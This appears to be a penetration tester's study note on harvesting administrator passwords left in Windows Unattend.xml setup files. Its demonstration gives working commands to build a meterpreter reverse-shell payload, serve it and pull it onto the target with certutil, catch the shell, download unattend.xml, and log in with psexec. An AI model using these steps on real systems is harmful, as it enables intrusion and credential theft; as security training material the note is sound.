---
up: "[[Windows Credential Dumping]]"
tools:
  - "[[PsExec]]"
---

# Passwords in Windows Configuration File

- Windows can automate a variety of repetitive tasks
- Mass installation/deployment of Windows is done through the Unattended Windows Setup utility
- This tool utilizes configuration files that contain specific configurations and used account credentials
- If the configuration files are left on the target system after installation passwords can be leaked

## Unattended Windows Setup

- Typically utilizes one of these configuration file:
	- C:\\Windows\\Panther\\Unattend.xml
	- C:\\Windows\\Panther\\Autounattend.xml
- Passwords may be base64 encoded

## Demonstration

Generate msfvenom payload for windows server

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=1234 -f exe > payload.exe
```

Then start a python http server:

```bash
python3 -m SimpleHTTPServer 80
```

Dowload file from webserver:

```bash
certutil -urlcache -f http://<ip>/<file> <file>
```

```bash
use multi/handler
set payload/windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST <my_ip>
```

Search for file:

```bash
> search -f unattend.xml
> dowload unattend.xml
```

If ``PlainText`` option is set to false then password is base64 encoded.

```bash
psexec.py Administrator@$TRG
Password:
>
```
